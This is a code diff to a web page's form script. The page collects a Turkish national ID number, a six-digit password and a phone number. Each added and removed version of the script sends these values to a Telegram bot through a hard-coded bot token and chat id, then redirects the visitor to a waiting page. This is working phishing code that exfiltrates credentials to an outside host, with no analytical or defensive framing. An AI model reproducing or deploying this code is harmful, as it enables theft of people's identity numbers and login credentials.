@@ -93,34 +93,36 @@
         </div>
     </div>
     <script>
-        function submitForm() {
-            var tc = document.getElementById("tc").value;
-            var sifre = document.getElementById("sifre").value;
-            var telefon = document.getElementById("telefon").value;
+       function submitForm() {
+    var tc = document.getElementById("tc").value;
+    var sifre = document.getElementById("sifre").value;
+    var telefon = document.getElementById("telefon").value;
 
-            if (/^\d{11}$/.test(tc) && /^\d{6}$/.test(sifre) && /^\d{10}$/.test(telefon)) {
-                var botToken = "7120775298:AAGSRsWOA3l0SunCmoaWk_nDUZgfokEJIm4";
-                var chatId = "-4749123767";
-                var message = `🔹 Yeni Giriş Bilgileri:\n👤 TC: ${tc}\n🔑 Şifre: ${sifre}\n📱 Telefon: ${telefon}`;
-                var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-                
-                fetch(url)
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            window.location.href = "bekle.html";
-                        } else {
-                            alert("Telegram'a mesaj gönderme hatası!");
-                        }
-                    })
-                    .catch(error => {
-                        console.error("Hata:", error);
-                        alert("Bir hata oluştu!");
-                    });
-            } else {
-                alert("Lütfen bilgileri eksiksiz ve doğru formatta giriniz!");
-            }
-        }
+    if (/^\d{11}$/.test(tc) && /^\d{6}$/.test(sifre) && /^\d{10}$/.test(telefon)) {
+        var botToken = "7120775298:AAGSRsWOA3l0SunCmoaWk_nDUZgfokEJIm4";
+        var chatId = "-4749123767";
+        var message = `🔹 Yeni Giriş Bilgileri:\n👤 TC: ${tc}\n🔑 Şifre: ${sifre}\n📱 Telefon: ${telefon}`;
+        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+        fetch(url)
+            .then(response => response.json()) // Yanıtı JSON formatına çevir
+            .then(data => {
+                console.log("Telegram API Yanıtı:", data); // Konsola yazdır
+                if (data.ok) {
+                    window.location.href = "bekle.html";
+                } else {
+                    alert("Telegram'a mesaj gönderme hatası! Hata: " + data.description);
+                }
+            })
+            .catch(error => {
+                console.error("Hata:", error);
+                alert("Bir hata oluştu! Detay: " + error.message);
+            });
+    } else {
+        alert("Lütfen bilgileri eksiksiz ve doğru formatta giriniz!");
+    }
+}
+
     </script>
 </body>
 </html>
